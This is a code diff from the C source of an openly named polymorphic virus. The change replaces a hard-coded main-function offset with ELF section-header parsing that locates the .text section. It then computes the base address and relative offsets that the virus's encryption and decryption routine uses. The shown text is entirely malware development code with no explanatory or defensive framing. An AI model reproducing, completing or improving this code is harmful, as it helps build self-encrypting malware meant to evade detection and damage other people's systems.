@@ -10,9 +10,8 @@
 #include <stdlib.h>
 #include <sys/mman.h>
 
-/* WARNING: Ensure this is updated on every compilation | Defines hex offset of main function */
-#define _main_ "0x1240"
 
+unsigned long offset; /* will store the offset of the .text section */
 
 void  *data;
 Elf64_Ehdr    *elf;
@@ -37,36 +36,39 @@ int filesize(int fd)
 }
 
 
-void print_section(Elf64_Shdr *shdr, char *strTab, int shNum, uint8_t *data)
+void text_offset(Elf64_Shdr *shdr, char *strTab, int shNum, uint8_t *data)
 {
   int   i;  
 
   for(i = 0; i < shNum; i++) {
     size_t k;
-     printf("%02d: %s Offset %lx\n", i, &strTab[shdr[i].sh_name], 
-        shdr[i].sh_offset);
+    //  printf("%02d: %s Offset %lx\n", i, &strTab[shdr[i].sh_name], 
+    //     shdr[i].sh_offset);
+	if(strcmp(".text", &strTab[shdr[i].sh_name]) == 0){
+		offset =  shdr[i].sh_offset;
+	}
+
   }
 }
 
 int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encrypt_size, unsigned long virus_decrypt_offset)
 {
 
+	/* open the virus elf file and get the offset to the .text section*/
 	fd = open(filename, O_RDONLY);
 	data = mmap(NULL, filesize(fd), PROT_READ, MAP_SHARED, fd, 0);
 	elf = (Elf64_Ehdr *) data;
 	shdr = (Elf64_Shdr *) (data + elf->e_shoff);
 	strtab = (char *)(data + shdr[elf->e_shstrndx].sh_offset);
-	print_section(shdr, strtab, elf->e_shnum, (uint8_t*)data);
+	
+	text_offset(shdr, strtab, elf->e_shnum, (uint8_t*)data);
 	close(fd);
-
 
 	// seed the random number generator
 	srand(time(NULL));
 
-	// convert hex value of _main_ offset to unsigned long
-	unsigned long main_int =  (int)strtol(_main_, NULL, 16);
 	// get base address of executable
-	unsigned long base_addr = virus_instruction_begin - main_int;
+	unsigned long base_addr = virus_instruction_begin - offset;
 
 	// calculate offset of virus_instruction_begin in relative to base address of executable
 	virus_instruction_begin = virus_instruction_begin - base_addr;
